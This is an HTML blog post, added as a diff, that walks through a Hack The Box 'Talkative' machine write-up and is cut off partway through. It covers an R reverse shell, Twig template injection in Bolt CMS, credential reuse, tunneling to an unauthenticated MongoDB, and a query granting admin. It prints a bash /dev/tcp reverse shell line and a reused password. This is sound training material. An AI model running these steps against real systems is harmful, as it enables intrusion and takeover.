@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <link rel="stylesheet" type="text/css" href="/assets/css/print.css" media="print">
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Writeup [Linux - Hard] - Talkative | OmniSl4sh’s Blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="HTB Writeup [Linux - Hard] - Talkative" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/2022/10/19/Talkative.html" />
+<meta property="og:url" content="http://localhost:4000/2022/10/19/Talkative.html" />
+<meta property="og:site_name" content="OmniSl4sh’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-10-19T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Writeup [Linux - Hard] - Talkative" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-19T00:00:00+02:00","datePublished":"2022-10-19T00:00:00+02:00","headline":"HTB Writeup [Linux - Hard] - Talkative","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2022/10/19/Talkative.html"},"url":"http://localhost:4000/2022/10/19/Talkative.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body>
+    <div id="container">
+      <div class="inner">
+        <header>
+          <h1><a href="http://localhost:4000/">OmniSl4sh's Blog</a></h1>
+          <h2></h2>
+        </header>
+        <!--<<section id="downloads" class="clearfix">
+          
+  
+        </section>
+        hr>-->
+        <section id="main_content">
+          <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HTB Writeup [Linux - Hard] - Talkative</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-10-19T00:00:00+02:00" itemprop="datePublished">Oct 19, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><img src="/assets/Talkative/Talkative.png" alt="" /></p>
+
+<h2 id="summary">Summary</h2>
+<ul>
+  <li><strong>Talkative</strong> is a <strong>Linux</strong> box with a <strong>long chain of exploitation</strong> that went <strong><em>through several containers</em></strong> to finally crack the host.</li>
+  <li>The <strong>intial foothold</strong> is through <strong>an analytics web app</strong> called <strong>Jamovi</strong> that was on <strong>port 8080</strong>. It had a <strong>plugin called “RJ Editor”</strong> which allowed us to <strong>run system commands</strong> using <strong>the R language.</strong></li>
+  <li><strong><em>With an R reverse shell,</em></strong> we <strong>got on that application’s container</strong> as <code class="language-plaintext highlighter-rouge">root</code>.</li>
+  <li>We attempted to <strong>break out of it</strong> and <strong>get on the host</strong> but couldn’t find a way to do that.</li>
+  <li><em>In that docker’s</em> <code class="language-plaintext highlighter-rouge">/root</code> <em>directory,</em> we <strong>found an archive</strong> called <code class="language-plaintext highlighter-rouge">Bolt-Administration</code> which <strong>contained 3 sets of credentials.</strong></li>
+  <li>We <strong>reused the passwords</strong> we found on the <strong>Bolt CMS instance</strong> on <strong>port 80</strong> and <strong>could log in</strong> as <code class="language-plaintext highlighter-rouge">admin</code></li>
+  <li><em>Because Bolt CMS used the</em> <strong>Twig PHP template engine</strong>, we were able to <strong>abuse it</strong> to <strong>obtain RCE</strong> via <strong>Server-Side Template Injection (SSTI).</strong></li>
+  <li>We got a shell as <code class="language-plaintext highlighter-rouge">www-data</code> within <strong>the Bolt container</strong>. <em>And from it,</em> we could <code class="language-plaintext highlighter-rouge">SSH</code> to the host <strong>using the credentials we found</strong> (port 22 was filtered from the outside).</li>
+  <li><em>On the host,</em> we <strong>uploaded a standalone version of</strong> <code class="language-plaintext highlighter-rouge">nmap</code> and did a <strong>full port scan</strong> on <strong>all the hosted docker instances.</strong></li>
+  <li><strong>One of the containers</strong> had <strong>port 27017 open</strong> which is the <strong>default port for MongoDB.</strong></li>
+  <li>We set up <code class="language-plaintext highlighter-rouge">chisel</code> to <strong>forward any connections</strong> from our Kali to that port. And <strong>could access the Mongo database</strong> <em>through the tunnel</em> <strong><em>without authentication</em></strong>.</li>
+  <li><em>While checking Mongo,</em> we <strong>found the database for RocketChat</strong> which we could alter.</li>
+  <li><em>To abuse it,</em> we <strong>registered a user</strong> through the RocketChat web application and <strong>changed our role to</strong> <code class="language-plaintext highlighter-rouge">admin</code> with a NoSQL update statement.</li>
+  <li>We could <strong>obtain RCE</strong> through the app by <strong>creating an Integration</strong> for an <strong>incoming web hook</strong> that <strong>ran server-side JavaScript</strong> when triggered.</li>
+  <li><em>After getting</em> <strong><em>a reverse shell on the RocketChat container</em></strong> <em>as</em> <code class="language-plaintext highlighter-rouge">root</code>, we <strong>installed a few dependencies</strong> to <strong>detect dangerous capabilities.</strong></li>
+  <li>We found the <code class="language-plaintext highlighter-rouge">cap_dac_read_search</code> and <code class="language-plaintext highlighter-rouge">cap_dac_override</code> capabilities and <strong>exploited them</strong> to <strong>write an SSH public key</strong> over the host’s <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code> file then <strong>used the private key to SSH to it</strong> as <code class="language-plaintext highlighter-rouge">root</code>.</li>
+</ul>
+
+<hr />
+
+<h2 id="nmap">NMAP</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Thu Sep  8 05:52:25 2022 as: nmap -sC -sV --version-all -oN 10.10.11.155-full-scan.nmap -p 22,80,3000,8080,8081,8082 10.10.11.155
+Nmap scan report for talkative (10.10.11.155)
+Host is up (0.12s latency).
+
+PORT     STATE    SERVICE VERSION
+22/tcp   filtered ssh
+80/tcp   open     http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://talkative.htb
+|_http-server-header: Apache/2.4.52 (Debian)
+3000/tcp open     ppp?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     X-XSS-Protection: 1
+|     X-Instance-ID: Bcy5tmWBNwCAATRnA
+|     Content-Type: text/html; charset=utf-8
+|     Vary: Accept-Encoding
+|     Date: Thu, 08 Sep 2022 09:52:38 GMT
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true"&gt;
+|     &lt;meta charset="utf-8" /&gt;
+|     &lt;meta http-equiv="content-type" content="text/html; charset=utf-8" /&gt;
+|     &lt;meta http-equiv="expires" content="-1" /&gt;
+|     &lt;meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt;
+|     &lt;meta name="fragment" content="!" /&gt;
+|     &lt;meta name="distribution" content="global" /&gt;
+|     &lt;meta name="rating" content="general" /&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" /&gt;
+|     &lt;meta name="mobile-web-app-capable" content="yes" /&gt;
+|     &lt;meta name="apple-mobile-web-app-capable" conten
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     X-XSS-Protection: 1
+|     X-Instance-ID: Bcy5tmWBNwCAATRnA
+|     Content-Type: text/html; charset=utf-8
+|     Vary: Accept-Encoding
+|     Date: Thu, 08 Sep 2022 09:52:39 GMT
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true"&gt;
+|     &lt;meta charset="utf-8" /&gt;
+|     &lt;meta http-equiv="content-type" content="text/html; charset=utf-8" /&gt;
+|     &lt;meta http-equiv="expires" content="-1" /&gt;
+|     &lt;meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt;
+|     &lt;meta name="fragment" content="!" /&gt;
+|     &lt;meta name="distribution" content="global" /&gt;
+|     &lt;meta name="rating" content="general" /&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" /&gt;
+|     &lt;meta name="mobile-web-app-capable" content="yes" /&gt;
+|     &lt;meta name="apple-mobile-web-app-capable" conten
+|   Help, NCP: 
+|_    HTTP/1.1 400 Bad Request
+8080/tcp open     http    Tornado httpd 5.0
+|_http-title: jamovi
+|_http-server-header: TornadoServer/5.0
+8081/tcp open     http    Tornado httpd 5.0
+|_http-title: 404: Not Found
+|_http-server-header: TornadoServer/5.0
+8082/tcp open     http    Tornado httpd 5.0
+|_http-title: 404: Not Found
+|_http-server-header: TornadoServer/5.0
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">nmap</code> gives us <strong>a lot of ports</strong> to check out: <strong>80, 3000 and 8080 through 8082</strong>. <strong>SSH</strong> is there but <em>filtered</em> which suggest it’s closed off by a firewall or something.</p>
+
+<ul>
+  <li><strong>Port 80</strong> redirects to <code class="language-plaintext highlighter-rouge">http://talkative.htb</code> so we have <strong>a host name</strong> to add to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file and we might want to <strong>search for other vhosts.</strong></li>
+  <li><strong>Port 3000</strong> seems to be a <strong>web application.</strong></li>
+  <li><strong>Port 8080</strong> has <strong>Jamovi</strong> as a title which seems interesting.</li>
+  <li><strong>Ports 8081 and 8082</strong> give a <code class="language-plaintext highlighter-rouge">404 - Not Found</code>. there might be more to them.</li>
+  <li><em>And Lastly,</em> <strong>all 808X ports</strong> are hosted on a <strong>different type of web server</strong> called <strong>“Tornado httpd”</strong> with a version of 5.0 (we could check if it’s vulnerble)</li>
+</ul>
+
+<h2 id="checking-out-port-80">Checking Out Port 80</h2>
+<p><em>After modifying the</em> <code class="language-plaintext highlighter-rouge">/etc/hosts</code> <em>file with the</em> <code class="language-plaintext highlighter-rouge">talkative.htb</code> <em>hostname</em>, we visit the website:</p>
+
+<p><img src="/assets/Talkative/Port-80-wappalyzer.jpg" alt="" /></p>
+
+<p><strong>Wappalyzer</strong> shows us it’s running <strong>Bolt CMS</strong> and <strong>PHP as its server-side language</strong>. Good to know.</p>
+
+<p>we also find a <strong>list of usernames</strong> there:</p>
+
+<p><img src="/assets/Talkative/port-80-usernames-and-links.jpg" alt="" /></p>
+
+<p>each user’s <strong>“Read More”</strong> link takes us to <strong>another page with his email in it</strong>:</p>
+
+<p><img src="/assets/Talkative/janit-user-mail.jpg" alt="" /></p>
+
+<p>we get 3 usernames/emails:</p>
+
+<ol>
+  <li><strong>Janit Smith</strong> [janit@talkative.htb]</li>
+  <li><strong>Saul Goodman</strong> [saul@talkative.htb]</li>
+  <li><strong>Matt Williams</strong> [matt@talkative.htb]</li>
+</ol>
+
+<p><em>Down at the bottom,</em> we also find <strong>references to 3 products</strong></p>
+
+<p><img src="/assets/Talkative/port-80-products.jpg" alt="" /></p>
+
+<h3 id="1-talkzone">1. TALKZONE</h3>
+<p>the first one was <em>a bit vague</em></p>
+
+<p><img src="/assets/Talkative/port-80-talkzone.jpg" alt="" /></p>
+
+<h3 id="2-talkforbiz-coming-soon">2. TALKFORBIZ (Coming Soon)</h3>
+
+<p>this one talked about an application called <strong>“RocketChat”</strong> where it’s <strong>free to register</strong> an account.</p>
+
+<p><img src="/assets/Talkative/port-80-talkforbiz-rocket-chat-hint.jpg" alt="" /></p>
+
+<h3 id="3-talk-a-stats-coming-soon">3. TALK-A-STATS (Coming Soon)</h3>
+
+<p><strong>Jamovi</strong> is mentioned here as well as <strong>a link to it.</strong></p>
+
+<p><img src="/assets/Talkative/port-80-talkastats.jpg" alt="" /></p>
+
+<p><em>But apart from that,</em> <strong>there wasn’t much here</strong> to played with. So we moved on..</p>
+
+<h2 id="checking-port-3000">Checking Port 3000</h2>
+
+<p><em>Over port 3000,</em> we found <strong>the homepage for RocketChat</strong>. It indeed <strong>allowed registration</strong> as mentioned above.</p>
+
+<p><img src="/assets/Talkative/port-3000-rocket-registration.jpg" alt="" /></p>
+
+<p>We <strong>could register</strong> with <code class="language-plaintext highlighter-rouge">test@talkative.htb</code>. Trying other domains like <code class="language-plaintext highlighter-rouge">@test.com</code> didn’t work.</p>
+
+<p>The <strong>“Channels”</strong> area had one channel: <strong>“#general”</strong>. There wasn’t any information there.</p>
+
+<p><img src="/assets/Talkative/port-3000-empty-chat.jpg" alt="" /></p>
+
+<p><em>Before diving any deeper here, ex:</em> <strong><em>fingerprinting the web app’s version</em></strong> <em>and</em> <em>searching for exploits,</em> we decided to first <strong>take a quick look on Jamovi</strong>.</p>
+
+<h2 id="the-jamovi-web-app-and-container">The Jamovi Web App and Container</h2>
+
+<p>The home page had <strong>an indicator of a vulnerability.</strong></p>
+
+<p><img src="/assets/Talkative/jamovi-first-look.jpg" alt="" /></p>
+
+<p><em>On the toolbar above,</em> there was <strong>an “R” icon</strong> which had a drop-down menu. It had something called <strong>“RJ Editor”.</strong></p>
+
+<p><img src="/assets/Talkative/jamovi-rj-editor.jpg" alt="" /></p>
+
+<p><em>When checking it out,</em> it seemed like <strong>a web console</strong> where we could <strong>run code.</strong></p>
+
+<p><img src="/assets/Talkative/jamovi-rj-editor-code.jpg" alt="" /></p>
+
+<p><strong>“R”</strong> is a <strong>programming language</strong> commonly used for <strong>statistics-related stuff</strong>. <strong><em>But can we abuse it?</em></strong></p>
+
+<p>we searched <strong>Google</strong> for <strong>“r reverse shell”</strong></p>
+
+<p><img src="/assets/Talkative/search-r-reverse-shell.jpg" alt="" /></p>
+
+<p>and found this <a href="https://gist.github.com/trietptm/05f385df4d2d8c0ee35b217e7307e462">Github gist</a> as the first result</p>
+
+<p><img src="/assets/Talkative/r-reverse-shell-gist.jpg" alt="" /></p>
+
+<p>it got us <strong>a shell</strong> as <code class="language-plaintext highlighter-rouge">root</code></p>
+
+<p><img src="/assets/Talkative/jamovi-container-rooted.jpg" alt="" /></p>
+
+<p><em>the first thing we noticed after getting in,</em> was <strong>being in a container.</strong></p>
+
+<p>we could tell from the <code class="language-plaintext highlighter-rouge">.dockerenv</code> file in the system root.</p>
+
+<p><img src="/assets/Talkative/jamovi-container.jpg" alt="" /></p>
+
+<h3 id="finding-creds-in-the-root-users-directory">Finding Creds in the Root User’s Directory</h3>
+
+<p><em>In</em> <code class="language-plaintext highlighter-rouge">/root</code>, we found <strong>an interesting file:</strong> <code class="language-plaintext highlighter-rouge">bolt-administration.omv</code></p>
+
+<p><img src="/assets/Talkative/jamovi-container-root-dir.jpg" alt="" /></p>
+
+<p><em>But since the</em> <code class="language-plaintext highlighter-rouge">unzip</code> <em>utility wasn’t there on the docker,</em> we used a <strong>bash trick</strong> -<em>commonly-used in reverse shells</em>- to <strong>transfer it back</strong> to our Kali.</p>
+
+<p><img src="/assets/Talkative/file-transfer-without-nc.jpg" alt="" /></p>
+
+<p><em>Having</em> <strong><em>verified the file’s integrity</em></strong> <em>using</em> <code class="language-plaintext highlighter-rouge">md5sum</code>, we <strong>unzipped the archive</strong>.</p>
+
+<p><img src="/assets/Talkative/unzipping-bolt-archive.jpg" alt="" /></p>
+
+<p>the <code class="language-plaintext highlighter-rouge">xdata.json</code> file within had the <strong><em>kind of loot we were looking for :D</em></strong></p>
+
+<p><img src="/assets/Talkative/bolt-archive-loot.jpg" alt="" /></p>
+
+<p><em>from the file’s name,</em> we know that <strong>the creds inside should work for Bolt.</strong></p>
+
+<p><em>but before taking that route,</em> we must first do <strong>a couple of important checks.</strong></p>
+
+<h3 id="check-1-scanning-our-subnet-and-attempting-to-reach-the-host">Check #1: Scanning our Subnet and Attempting to Reach the Host</h3>
+
+<p>we need to <strong>discover the Container Environment</strong> and see if we can <strong>reach the host</strong> spawning our docker.</p>
+
+<p><em>if the host</em> <strong><em>exposed its SSH port</em></strong> <em>to our container,</em> we could try <strong>reusing the creds</strong> we found there.</p>
+
+<p>we will first <strong>get our docker’s IP</strong> using <code class="language-plaintext highlighter-rouge">hostname -i</code></p>
+
+<p><img src="/assets/Talkative/jamovi-container-ip.jpg" alt="" /></p>
+
+<p>we’re at <code class="language-plaintext highlighter-rouge">172.18.0.2</code>.</p>
+
+<p><em>Usually,</em> the host <strong>holds the first IP</strong> on the subnet (<em>here,</em> that would be <code class="language-plaintext highlighter-rouge">172.18.0.1</code>).</p>
+
+<p><em>To confirm this,</em> we needed either <code class="language-plaintext highlighter-rouge">ping</code> or <code class="language-plaintext highlighter-rouge">ssh</code>. but <strong><em>neither was available :/</em></strong></p>
+
+<p><img src="/assets/Talkative/jamovi-container-no-ping-no-ssh-client.jpg" alt="" /></p>
+
+<p>A <strong>handy tool</strong> here would be <code class="language-plaintext highlighter-rouge">nmap</code>. we’re going to upload a <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">Standalone Binary</a> for it to our container.</p>
+
+<p><em>For the transfer,</em> we used the <strong>same bash tricks</strong> as earlier but <em>in the opposite direction</em> this time.</p>
+
+<p><img src="/assets/Talkative/jamovi-container-transfer-nmap.jpg" alt="" /></p>
+
+<p>we ran <strong>a quick network discovery</strong> with <code class="language-plaintext highlighter-rouge">-sn</code> and <strong>increased the rate</strong> with <code class="language-plaintext highlighter-rouge">--min-rate</code> and <code class="language-plaintext highlighter-rouge">-T4</code> for speed</p>
+
+<p><img src="/assets/Talkative/jamovi-container-network-discovery.jpg" alt="" /></p>
+
+<p>we <strong>only found</strong> the <code class="language-plaintext highlighter-rouge">172.18.0.1</code> host up.</p>
+
+<p><em>Next,</em> we ran a <strong>full port scan</strong> against it.</p>
+
+<p><em>but to do that,</em> <code class="language-plaintext highlighter-rouge">nmap</code> needed a file (<code class="language-plaintext highlighter-rouge">/etc/services</code>) that was missing.</p>
+
+<p>that file <strong>was there on our Kali</strong>. so we got it and re-ran <code class="language-plaintext highlighter-rouge">nmap</code>.</p>
+
+<p><img src="/assets/Talkative/jamovi-container-no-ssh-to-host.jpg" alt="" /></p>
+
+<p>the <strong>SSH port was filtered</strong>. <strong><em>Still worth it though :)</em></strong></p>
+
+<p>the <strong>remaining ports</strong> were <em>already exposed from outside</em>. so we moved on..</p>
+
+<h3 id="check-2-attempting-to-escape-our-container">Check #2: Attempting to Escape our Container</h3>
+
+<p><em>Because we had the</em> <code class="language-plaintext highlighter-rouge">root</code> <em>privilege</em>, it was also worth it to run a tool like <a href="https://github.com/stealthcopter/deepce">deepce.sh</a> to <strong>try and break out of our docker onto the host.</strong></p>
+
+<p><img src="/assets/Talkative/jamovi-deepce-sh.jpg" alt="" /></p>
+
+<p>The <strong>capability</strong> we found: <code class="language-plaintext highlighter-rouge">cap_dac_override</code> wasn’t dangerous on its own.</p>
+
+<p>It required the <code class="language-plaintext highlighter-rouge">cap_dac_read_search</code> with it to <strong><em>enable a Docker escape.</em></strong></p>
+
+<p><em>Having</em> <strong>checked the above shorcuts</strong> <em>and found them closed,</em> we can now <strong><em>safely pay Bolt a visit without looking back :)</em></strong></p>
+
+<h2 id="reusing-creds-on-bolt-and-exploiting-it-for-rce">Reusing Creds on Bolt and Exploiting it for RCE</h2>
+
+<p><em>To find bolt’s login page,</em> we <strong>searched Google:</strong> “bolt admin login”.</p>
+
+<p>we found the <a href="https://docs.boltcms.io/5.0/manual/login">Official Documentation Page</a></p>
+
+<p><em>according to it,</em> the <code class="language-plaintext highlighter-rouge">/bolt</code> web directory <strong>contains the login page.</strong></p>
+
+<p><img src="/assets/Talkative/bolt-login-page.jpg" alt="" /></p>
+
+<p>Trying <strong>all the usernames</strong> and <strong>emails</strong> with <strong>all the passwords</strong> didn’t get us in.</p>
+
+<p><em>However,</em> trying the <code class="language-plaintext highlighter-rouge">admin</code> username worked with <code class="language-plaintext highlighter-rouge">jeO09ufhWD&lt;s</code> (<code class="language-plaintext highlighter-rouge">matt</code><em>’s password</em>).</p>
+
+<p><em>Looking around for RCE venues,</em> we tried to <strong>upload a PHP reverse shell</strong> since Bolt ran it server-side.</p>
+
+<p>But <strong>that file type wasn’t allowed.</strong></p>
+
+<p><img src="/assets/Talkative/bolt-fail-to-upload-php.jpg" alt="" /></p>
+
+<p>And <strong>editing the config file</strong> wasn’t an option either.</p>
+
+<p><img src="/assets/Talkative/bolt-cant-edit-config-file.jpg" alt="" /></p>
+
+<p><em>However, since the</em> <code class="language-plaintext highlighter-rouge">.twig</code> <em>file extension was allowed,</em> we had a chance to <strong>execute code</strong> through <strong>Server-Side Template Injection (SSTI).</strong></p>
+
+<p><em>because</em> <strong>Twig</strong> <em>is a</em> <strong>template engine for PHP</strong>, it essentially <strong>enables us to run server-side code.</strong></p>
+
+<p><em>To proceed,</em> we went to <strong>“File Management”</strong> &gt; <strong>“View &amp; edit templates”</strong></p>
+
+<p><img src="/assets/Talkative/bolt-view-edit-templates.jpg" alt="" /></p>
+
+<p>We <strong>chose the “base-2021” theme</strong> since it was the one <em>likely in use</em> then selected <code class="language-plaintext highlighter-rouge">index.twig</code> for editing.</p>
+
+<p><img src="/assets/Talkative/bolt-index-twig-writable.jpg" alt="" /></p>
+
+<p><em>it looked writable,</em> so we next <strong>inserted a standard SSTI payload</strong> from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#twig">PayloadAllTheThings</a> Github Repo</p>
+
+<p><img src="/assets/Talkative/bolt-basic-ssti-payload.jpg" alt="" /></p>
+
+<p><em>After saving,</em> this payload was <strong>expected to reflect</strong> on the home page.</p>
+
+<p>But that <strong>change didn’t take effect</strong> until we <strong>“Cleared the Cache”</strong> from the option under the <strong>“Maintenance”</strong> section.</p>
+
+<p><img src="/assets/Talkative/bolt-clear-the-cache-feature.jpg" alt="" /></p>
+
+<p>the <strong>number 49</strong> appeared at the <strong>top right corner</strong> of the page.</p>
+
+<p><img src="/assets/Talkative/bolt-ssti-execution-confirmed.jpg" alt="" /></p>
+
+<p><em>Having</em> <strong><em>confirmed code execution,</em></strong> we switched to a <strong>base64-encoded bash reverse shell</strong> payload:</p>
+
+<p><img src="/assets/Talkative/bolt-ssti-bash-reverse-shell.jpg" alt="" /></p>
+
+<p><strong>which is</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.16.9/9000 0&gt;&amp;1
+</code></pre></div></div>
+
+<p><em>with another cache clear and a visit to the home page,</em> we <strong>get back a shell</strong> as <code class="language-plaintext highlighter-rouge">www-data</code></p>
+
+<p><img src="/assets/Talkative/bolt-ssti-shell-access.jpg" alt="" /></p>
+
+<h2 id="enumerating-the-2nd-container-subnet-and-reaching-the-host">Enumerating the 2nd Container Subnet and Reaching the Host</h2>
+
+<p><strong>Listing the contents of the system root</strong> showed us we were now in <strong>another Docker container</strong> but with a <strong>different IP</strong> of <code class="language-plaintext highlighter-rouge">172.17.0.13</code></p>
+
+<p><img src="/assets/Talkative/bolt-docker-ip.jpg" alt="" /></p>
+
+<p>This was a <strong>different subnet</strong> from the <strong>Jamovi</strong> container’s (<code class="language-plaintext highlighter-rouge">172.18.0.0/24</code>).</p>
+
+<p><strong><em>to discover this area,</em></strong> we’re going to do <strong>the same thing as before:</strong> use <code class="language-plaintext highlighter-rouge">nmap</code></p>
+
+<p><img src="/assets/Talkative/bolt-docker-getting-nmap.jpg" alt="" /></p>
+
+<p><em>after transferring it,</em> we run <strong>a host discovery</strong> over the <code class="language-plaintext highlighter-rouge">172.17.0.0/24</code> subnet</p>
+
+<p><img src="/assets/Talkative/bolt-docker-nmap-discovery.jpg" alt="" /></p>
+
+<p>we found <strong>a LOT of live devices</strong> there (<em>from</em> <code class="language-plaintext highlighter-rouge">172.17.0.1</code> <em>all the way up to</em> <code class="language-plaintext highlighter-rouge">172.17.0.19</code>)</p>
+
+<p>we’ve been wanting to <strong>try the creds</strong> we found <strong>on the host’s SSH port</strong>. <em>But it was always filtered.</em></p>
+
+<p><em>However, on this container,</em> we found the <strong>SSH client installed</strong> which was interesting.</p>
+
+<p>we tried to <strong>connect to the host</strong> as <code class="language-plaintext highlighter-rouge">root</code>:</p>
+
+<p><img src="/assets/Talkative/bolt-docker-try-ssh-to-host.jpg" alt="" /></p>
+
+<p><em>After a couple of tries,</em> the <strong>set of creds</strong> that worked were:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>saul
+jeO09ufhWD
+</code></pre></div></div>
+
+<p><img src="/assets/Talkative/ssh-as-saul.jpg" alt="" /></p>
+
+<h2 id="finding-rocketchats-mongodb-instance-and-altering-it">Finding RocketChat’s MongoDB Instance and Altering it</h2>
+
+<p><em>Trying to privesc,</em> we ran <a href="https://github.com/carlospolop/PEASS-ng">linpeas</a> here. But we <strong>didn’t find a way</strong> to <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<p><em>but, when looking at</em> <strong>the system processes,</strong> we noticed <strong>plenty of docker instances</strong> running:</p>
+
+<p><img src="/assets/Talkative/host-enumerating-docker-processes.jpg" alt="" /></p>
+
+<ul>
+  <li><strong>Most of the ports</strong> were 80.</li>
+  <li>There was <strong>one for 3000</strong> which was <strong>probably RocketChat</strong>. A container we haven’t touched.</li>
+  <li>There were <strong>other high ports</strong> that we wanted to check.</li>
+</ul>
+
+<p><strong><em>But to be sure we weren’t missing any other ports,</em></strong> we uploaded <code class="language-plaintext highlighter-rouge">nmap</code> a 3rd time and ran a <strong>full port scan</strong> over the entire <code class="language-plaintext highlighter-rouge">172.17.0.2-19</code> IP range.</p>
+
+<p>And we <strong>did find something very interesting.</strong></p>
+
+<p><img src="/assets/Talkative/host-mongo-db-discovered.jpg" alt="" /></p>
+
+<p><strong>Port 27017</strong> is the <strong>default port for MongoDB</strong>. which is <strong>known for having no authentication</strong> <em>by default.</em></p>
+
+<p><em>to reach that port on the</em> <code class="language-plaintext highlighter-rouge">172.17.0.2</code> <em>host,</em> we will need <strong>some Port Forwarding magic.</strong></p>
+
+<p><a href="https://github.com/jpillora/chisel">Chisel</a> is a <strong>nice choice</strong> for its <strong>ease-of-use</strong>.</p>
+
+<p>we <strong>upload it</strong> to the bolt container and <strong>create a tunnel to Mongo.</strong></p>
+
+<p><img src="/assets/Talkative/tunneling-and-reaching-mongodb.jpg" alt="" /></p>
+
+<p><em>Having authenticated without any credentials,</em> we could <strong>enumerate the database</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># listing the databases</span>
+show dbs
+<span class="c"># using the meteor database</span>
+use meteor
+<span class="c"># showing collections within the meteor db (equivaled to tables in MySQL)</span>
+show collections
+</code></pre></div></div>
+
+<p><em>among the various collections,</em> we found one called <strong>“users”</strong> which had interesting stuff:</p>
+
+<p><img src="/assets/Talkative/saul-rockechat-user.jpg" alt="" /></p>
+
+<p>we noticed <code class="language-plaintext highlighter-rouge">saul</code>’s account, which <strong>had an admin role.</strong></p>
+
+<p><strong><em>Trying to compromise it,</em></strong> we:</p>
+<ol>
+  <li><strong>tried to login</strong> using the <strong>passwords we found earlier.</strong> none worked.</li>
+  <li>we also tried <strong>cracking the bcrypt hash</strong>. but without any luck.</li>
+  <li>we <strong>replaced that bcrypt hash</strong> with one of our own. <em>still, for some reason,</em> <strong>that change didn’t reflect.</strong></li>
+  <li>we even <strong>used his ID and token as cookies</strong> to impersonate him. but, <strong>that also didn’t work</strong> :/</li>
+</ol>
+
+<p><img src="/assets/Talkative/using-saul-cookies-for-impersonation.jpg" alt="" /></p>
+
+<p><strong><em>so, instead,</em></strong> we chose to <strong>update our user’s role</strong> in the database to <strong>grant him admin privileges :D</strong></p>
+
+<p>we ran the <strong>NoSQL update statement</strong> below to carry this out.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">db</span><span class="p">.</span><span class="nx">users</span><span class="p">.</span><span class="nx">update</span><span class="p">({</span> <span class="na">_id</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">voBu5qYu5ye3vDcw7</span><span class="dl">"</span><span class="p">},</span> <span class="p">{</span>
+	<span class="na">$set</span><span class="p">:</span> <span class="p">{</span> 
+		<span class="na">roles</span><span class="p">:</span> <span class="p">[</span><span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">]</span>
+	<span class="p">}</span>
+<span class="p">})</span>
+</code></pre></div></div>
+
+<p><img src="/assets/Talkative/mongo-grant-admin-role.jpg" alt="" /></p>
+
+<p>it <strong>ran without problems</strong>. we confirmed this with another query.</p>
+
+<p><img src="/assets/Talkative/mongo-admin-role-granted.jpg" alt="" /></p>
+
+<p><em>after relogging,</em> we could now <strong>access RocketChat’s administrator interface</strong> at <code class="language-plaintext highlighter-rouge">/admin</code></p>
+
+<p><img src="/assets/Talkative/rocket-chat-logged-in-as-admin.jpg" alt="" /></p>
+
+<p><em>Noticing the version,</em> we <strong>searched for exploits</strong> but <em>didn’t get any results.</em></p>
+
+<h2 id="exploiting-rocketchat-integrations-for-rce">Exploiting RocketChat Integrations for RCE</h2>
+<p><em>While searching</em> <strong><em>Google</em></strong> <em>for ways to</em> <strong><em>execute code using RocketChat’s admin,</em></strong> we came across a <strong>couple of results.</strong></p>
+
+<p><img src="/assets/Talkative/rocket-chat-search-admin-rce.jpg" alt="" /></p>
+
